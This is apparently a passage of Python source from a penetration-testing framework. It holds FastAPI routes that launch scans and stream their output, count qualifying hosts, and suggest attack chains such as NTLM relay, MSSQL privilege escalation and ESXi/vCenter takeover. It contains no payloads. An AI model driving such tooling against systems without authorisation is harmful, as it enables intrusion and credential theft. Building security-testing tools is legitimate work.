_rule_ntlm_username_harvest = _make_chain_rule(_CHAIN_RULES[5])
_rule_unauth_datastore_datamine = _make_chain_rule(_CHAIN_RULES[6])
_rule_mssql_linked_privesc = _make_chain_rule(_CHAIN_RULES[7])
_rule_coerce_and_relay = _make_chain_rule(_CHAIN_RULES[8])
_rule_printer_to_domain_creds = _make_chain_rule(_CHAIN_RULES[9])
_rule_ot_ics_process_impact = _make_chain_rule(_CHAIN_RULES[10])
_rule_esxi_vcenter_takeover = _make_chain_rule(_CHAIN_RULES[11])


_SUGGESTION_RULES = (
    _rule_domain,
    _rule_admin_user,
    _rule_hashes_potfile,
    _rule_relay_targets,
    _rule_ot_sweep,
    _rule_devices_vulns,
    _rule_mail_cross_transport,
    _rule_hostkey_reuse,
    _rule_hostname_vhosts,
    _rule_t3_capable_findings,
    # Chain rules (multi-trigger next-move handoffs):
    _rule_ad_kerberos_chain,
    _rule_smb_post_null_loot,
    _rule_cloud_metadata_pivot,
    _rule_container_orchestrator_escape,
    _rule_hashicorp_stack_secrets,
    _rule_ntlm_username_harvest,
    _rule_unauth_datastore_datamine,
    _rule_mssql_linked_privesc,
    _rule_coerce_and_relay,
    _rule_printer_to_domain_creds,
    _rule_ot_ics_process_impact,
    _rule_esxi_vcenter_takeover,
)


def register_scan_routes(app: FastAPI, ctx) -> None:
    eng_dir = ctx.eng_dir
    jobs = ctx.jobs
    broker = ctx.broker

    @app.get("/api/commands")
    def list_commands():
        """The command surface the UI renders its runner from (grouped, with the fields/
        flags each command accepts)."""
        return {k: {kk: v[kk] for kk in
                    ("label", "group", "targets", "profile", "creds", "lhost", "flags")}
                for k, v in _COMMANDS.items()}

    # Commands whose surface a plain TCP `enum` will never find, with the scan
    # that does find it. Without this a tester runs `recce ntp`, gets "no
    # targets", and has no way to know the reason is that 123 is UDP-only.
    _PREREQ = {
        "snmp": "SNMP is 161/udp — run `enum -U` (UDP sweep) first.",
        "ntp": "NTP is 123/udp — run `enum -U` (UDP sweep) first.",
        "ipmi": "IPMI is 623/udp — run `enum -U` (UDP sweep) first.",
        "modbus": "Modbus is 502/tcp but rarely in the default top-ports — "
                  "run `enum --all-ports` or scan 502 explicitly.",
        "winrm": "WinRM is 5985/5986 — outside the default top-ports on some profiles; "
                 "try `enum --all-ports` if the sweep missed it.",
        "netbios": "NetBIOS Name Service is 137/udp — run `enum -U` (UDP sweep) first.",
        "tftp": "TFTP is 69/udp — run `enum -U` (UDP sweep) first.",
        "ipp": "IPP/CUPS is 631/tcp — usually caught by the default sweep; try "
               "`enum` if not already run.",
        "x11": "X11 is 6000-6009/tcp — outside the default top-ports; try "
               "`enum --all-ports` or scan explicitly.",
        "sip": "SIP runs on both 5060/udp and 5060/tcp — a TCP-only sweep will miss "
               "many PBXes; run `enum -U` too.",
        "rservices": "The r-services (512/513/514) are outside the default sweep on "
                     "most profiles; scan explicitly if you suspect legacy Unix.",
    }

    @app.get("/api/scan/context")
    def scan_context():
        """Which discovered hosts qualify for each command.

        The targets field is free text, so a tester picking `mssql` has no way to
        know whether anything in the engagement even runs MSSQL. Counts come from
        each module's OWN `*_targets()` predicate rather than a port list copied
        into the web layer, so a module that changes what it matches cannot drift
        away from the hint shown here.
        """
        import importlib
        from ...cli._service_helpers import _MODULE_PATH
        from ...core.store import Store

        with Store(ctx.db_path) as st:
            hosts = [h for h in st.all_hosts() if h.is_up]

        out: dict = {}
        for cmd, path in sorted(_MODULE_PATH.items()):
            try:
                mod = importlib.import_module(path)
            except ImportError:
                continue
            # Prefer the canonical `<slug>_targets(hosts)` naming (e.g.
            # `ldap_targets` for cmd "ldap") so a helper named the same
            # way — even a class-scoped one — never shadows the module's
            # own targets fn. Fall back to any public `*_targets` for
            # services whose slug and function name genuinely diverge.
            canonical = cmd.replace("-", "_") + "_targets"
            fn = None
            if hasattr(mod, canonical) and callable(getattr(mod, canonical)):
                fn = getattr(mod, canonical)
            else:
                fn = next((getattr(mod, n) for n in dir(mod)
                           if n.endswith("_targets") and not n.startswith("_")
                           and callable(getattr(mod, n))), None)
            if fn is None:
                continue                     # web/api are HTTP-wide; handled below
            try:
                ips = sorted({t["ip"] for t in fn(hosts) if t.get("ip")})
            except Exception:                # noqa: BLE001 - a hint must never 500 the tab
                continue
            entry = {"count": len(ips), "sample": ips[:8]}
            if not ips and cmd in _PREREQ:
                entry["hint"] = _PREREQ[cmd]
            elif not ips:
                entry["hint"] = (f"No host in this engagement exposes {cmd}. "
                                 "Run `enum` first, or scan a host directly.")
            out[cmd] = entry

        # web/api have no *_targets(): they apply to every discovered HTTP surface.
        web_ips = sorted({h.ip for h in hosts for p in h.open_ports
                          if (p.service or "").lower().startswith("http")
                          or p.portid in (80, 443, 8080, 8443, 8000, 8888)})
        for cmd in ("web", "api"):
            out[cmd] = {"count": len(web_ips), "sample": web_ips[:8],
                        **({} if web_ips else
                           {"hint": "No HTTP surface discovered yet — run `enum` first."})}
        return {"hosts": len(hosts), "commands": out}

    @app.get("/api/scan/suggestions")
    def scan_suggestions():
        """"recce suggests…" — facts learned across the engagement, framed as
        prefills the Scan tab can apply with one click.

        The 10 shared-surface readers (known_domains / known_users / known_hashes
        / known_hostnames / known_hostkeys / known_mail_accounts / known_devices /
        known_ot_assets / relay_targets / hashloot) collectively hold every fact
        recce has learned; each rule below turns one class of fact into a small
        suggestion dict the frontend can dedup (`key`) and prefill against.

        Each rule is import-tolerant — a missing shared-surface module means
        that rule skips, never a 500. Rules are individually tiny (<20 LOC each)
        and idempotent: the same fact produces the same `key`, so a dismissed
        suggestion stays dismissed across page reloads.
        """
        import os as _os

        from ...core.store import Store
        with Store(ctx.db_path) as st:
            hosts = st.all_hosts()
            try:
                creds = st.all_credentials()
            except Exception:                    # noqa: BLE001
                creds = []
        loot_dir = _os.path.join(ctx.eng_dir, "loot")

        suggestions: list[dict] = []
        seen_keys: set[str] = set()
        for rule in _SUGGESTION_RULES:
            try:
                for sug in rule(hosts, creds, loot_dir) or []:
                    k = sug.get("key")
                    if not k or k in seen_keys:
                        continue
                    seen_keys.add(k)
                    suggestions.append(sug)
            except Exception:                    # noqa: BLE001 — no rule may 500 the tab
                continue
        return {"suggestions": suggestions}

    @app.get("/api/wordlists")
    def list_wordlists(kind: str | None = None):
        """The bundled wordlist catalog. Frontend renders these as a
        dropdown next to the free-text `--wordlist FILE` input. `kind`
        query param filters to a single family (paths / creds / users) so
        the postgres card's dropdown doesn't show HTTP path lists."""
        from ...services.wordlists import list_bundled
        return {"wordlists": list_bundled(kind)}

    @app.post("/api/scan")
    def start_scan(body: dict = Body(...), x_tester: str = Header(default="someone")):
        # `command` (any catalog entry); `phase` kept for older clients.
        command = str(body.get("command") or body.get("phase") or "run")
        spec = _COMMANDS.get(command)
        if spec is None:
            raise HTTPException(400, f"unknown command {command!r}")
        # Targets: split on whitespace OR commas (the field placeholder invites
        # comma lists — "10.0.0.0/24, 10.0.0.5, hostname"). Empty tokens
        # dropped; anything starting with '-' dropped (no flag injection).
        import re as _re
        targets = [t for t in _re.split(r"[\s,]+", str(body.get("targets", "")))
                   if t and not t.startswith("-")]
        if spec["targets"] == "required" and not targets:
            raise HTTPException(400, "this command needs targets")
        argv = [command, "-o", eng_dir]
        if spec["profile"]:
            profile = str(body.get("profile", "")).lower()
            if profile in ("quick", "standard", "thorough", "stealth"):
                argv += ["--profile", profile]
        if spec["creds"]:
            user = str(body.get("username", "")).strip()
            if user:
                argv += ["-u", user]
                pw = body.get("password")
                if pw not in (None, ""):
                    argv += ["-p", str(pw)]
                dom = str(body.get("domain", "")).strip()
                if dom:
                    argv += ["-d", dom]
        if spec["lhost"]:
            lh = str(body.get("lhost", "")).strip()
            if lh:
                argv += ["--lhost", lh]
        # Boolean flags: silent-drop anything not in the catalog.
        allowed = {f["name"]: f for f in spec["flags"]}
        for name in (body.get("flags") or []):
            f = allowed.get(name)
            if f and f.get("kind", "bool") == "bool" and f["flag"] not in argv:
                argv.append(f["flag"])
        # Value-carrying flags: `flag_values: {name: value}`. Splits list-kind
        # inputs on whitespace/commas so `--skip mssql,docker` becomes
        # `--skip mssql docker` (nargs='*' on the parser side).
        import re as _re
        used_list_flag = False
        for name, raw in (body.get("flag_values") or {}).items():
            f = allowed.get(name)
            if f is None or f.get("kind", "bool") == "bool":
                continue
            val = str(raw).strip()
            if not val:
                continue
            kind = f.get("kind", "bool")
            if kind == "int":
                try:
                    int(val)
                except ValueError:
                    continue                     # bad int → drop silently
                argv += [f["flag"], val]
            elif kind == "list":
                toks = [t for t in _re.split(r"[\s,]+", val) if t and not t.startswith("-")]
                if toks:
                    argv += [f["flag"], *toks]
                    used_list_flag = True
            elif kind == "wordlist":
                # Same wire shape as "text"; the wordlist loader on the
                # backend resolves `bundled:<name>` to an on-disk path.
                # Refuse dash-leading values (no flag injection) and refuse
                # `bundled:<name>` where the name isn't in the registry —
                # a typo shouldn't silently degrade to "no wordlist".
                if val.startswith("-"):
                    continue
                if val.startswith("bundled:"):
                    from ...services.wordlists import BUNDLED_WORDLISTS
                    name = val[len("bundled:"):].strip()
                    known = {e["name"] for e in BUNDLED_WORDLISTS}
                    if name not in known:
                        continue                # bad bundled name → drop
                argv += [f["flag"], val]
            else:                                # "text"
                if not val.startswith("-"):
                    argv += [f["flag"], val]
        if spec["targets"] != "none":
            # `--` separator when a list-kind flag was used: those flags declare
            # nargs='*' on the parser side, so argparse would otherwise eat the
            # trailing target IP into the list (--skip mssql 10.0.0.1 → skip=
            # [mssql, 10.0.0.1], no target). The explicit terminator forces
            # argparse to stop consuming for the option and treat what follows
            # as positionals.
            if used_list_flag:
                argv.append("--")
            argv += targets
        label = f"{command} {' '.join(targets)}".strip()
        full_argv = recce_argv(*argv)
        full_cmd = " ".join(full_argv)
        for j in jobs.list():
            if j.status == "running" and j.cmd == full_cmd:
                raise HTTPException(409, "an identical scan is already running")

        def _done(job):
            broker.publish({"type": "scan", "status": job.status, "tester": x_tester,
                            "targets": label})

        job = jobs.start(full_argv, on_done=_done)
        broker.publish({"type": "scan_started", "tester": x_tester, "targets": label})
        return {"id": job.id, "status": job.status, "cmd": job.cmd}

    @app.post("/api/jobs/{jid}/cancel")
    def cancel_job(jid: str):
        if not jobs.cancel(jid):
            raise HTTPException(404, "no running job with that id")
        return {"ok": True}

    @app.get("/api/jobs")
    def list_jobs():
        return [{"id": j.id, "cmd": j.cmd, "status": j.status, "lines": len(j.lines),
                 "started": j.started} for j in jobs.list()]

    @app.get("/api/jobs/{jid}/events")
    async def job_events(jid: str):
        job = jobs.get(jid)
        if job is None:
            raise HTTPException(404, "no such job")

        async def gen():
            i = 0
            while True:
                while i < len(job.lines):
                    yield f"data: {json.dumps({'line': job.lines[i]})}\n\n"
                    i += 1
                if job.status != "running":
                    yield f"data: {json.dumps({'done': True, 'status': job.status})}\n\n"
                    return
                await asyncio.sleep(0.3)

        return StreamingResponse(gen(), media_type="text/event-stream")
